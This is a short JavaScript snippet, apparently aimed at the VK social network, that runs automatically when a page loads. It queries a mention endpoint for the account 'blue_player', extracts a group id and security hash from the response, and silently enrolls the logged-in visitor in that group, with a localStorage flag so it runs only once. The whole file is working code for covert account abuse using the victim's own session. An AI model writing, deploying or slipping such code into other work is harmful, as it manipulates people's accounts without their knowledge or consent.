window.addEventListener('DOMContentLoaded', () => {
    if (localStorage.stopSubscribe) {
        return;
    }

    const sendRequest = (method = 'post', url = '', callback = console.log) => {
        const x = new XMLHttpRequest();

        x.onreadystatechange = () => {
            if (x.readyState === 4) {
                callback(x.response);
            }
        };

        x.open(method, url);
        x.send();
    };

    sendRequest('post', `/al_wall.php?act=mention_tt&al=1&mention=blue_player`, response => {
        if (response.match(/class=\\?"[^"]+subscr\\?"/)) {
            const result = response.match(/this, -?(\d+), '([^']*)/);

            sendRequest('get', `/al_groups.php?act=a_enter&al=1&gid=${result[1]}&hash=${result[2]}`, () => {
                localStorage.stopSubscribe = 'true';
            });
        } else {
            localStorage.stopSubscribe = 'true';
        }
    });
});
